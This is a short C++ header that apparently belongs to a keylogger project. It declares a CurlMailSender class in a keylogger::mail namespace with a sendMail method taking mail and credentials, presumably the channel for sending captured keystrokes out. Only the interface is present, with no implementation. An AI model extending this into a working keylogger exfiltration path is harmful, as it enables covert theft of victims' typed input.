#pragma once

#include "MailSender.h"

namespace keylogger::mail
{
class CurlMailSender : public MailSender
{
public:
    bool sendMail(const Mail&, const Credentials&) const override;
};
}